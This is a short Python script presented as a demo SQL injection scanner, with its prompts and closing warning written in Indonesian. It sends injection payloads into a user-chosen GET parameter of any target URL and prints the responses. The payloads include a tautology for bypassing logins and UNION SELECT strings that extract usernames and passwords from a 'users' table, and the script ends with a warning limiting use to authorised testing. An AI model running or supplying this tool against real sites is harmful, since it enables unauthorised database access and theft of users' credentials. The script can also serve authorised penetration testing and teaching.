import requests
import sys
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

def inject_payload(url, param, payload):
    """
    Inject SQL payload into the specified GET parameter in the URL
    """
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)
    if param not in query_params:
        print(f"Parameter '{param}' not found in URL.")
        return None
    # Replace the parameter value with the payload
    query_params[param] = [payload]
    
    new_query = urlencode(query_params, doseq=True)
    new_url = urlunparse((
        parsed_url.scheme,
        parsed_url.netloc,
        parsed_url.path,
        parsed_url.params,
        new_query,
        parsed_url.fragment
    ))
    try:
        response = requests.get(new_url, timeout=10)
        return response.text
    except Exception as e:
        print(f"Error during request: {e}")
        return None

def main():
    print("=== Demo SQL Injection Web Scanner ===")
    url = input("Masukkan URL target dengan parameter (misal: http://site.com/page.php?id=1): ").strip()
    param = input("Masukkan nama parameter yang akan diinjeksi (misal: id): ").strip()

    # Simple payloads - tautologi based injection to bypass auth or extract data
    payloads = [
        "' OR '1'='1",       # tautology to bypass login
        "' UNION SELECT username || ' : ' || password FROM users -- ",  # union select example for extracting user, pw from 'users' table (common)
        "' AND 1=0 UNION SELECT username, password FROM users -- "
    ]

    print("\n=== Mencoba payload SQL Injection ===")
    for i, payload in enumerate(payloads, 1):
        print(f"\nPayload {i}: {payload}")
        result = inject_payload(url, param, payload)
        if result:
            print("Response snippet:")
            snippet = result[:1000]  # show first 1000 chars for brevity
            print(snippet)
        else:
            print("Tidak ada response atau terjadi error.")

    print("""
PERINGATAN:
- Gunakan program ini hanya untuk tujuan edukasi dan pengujian keamanan pada sistem yang Anda miliki atau miliki izin testing-nya.
- Melakukan SQL Injection pada sistem tanpa izin adalah ilegal dan dapat berakibat hukum.
- Jangan digunakan untuk tindakan merugikan pihak lain.
""")

if __name__ == '__main__':
    main()
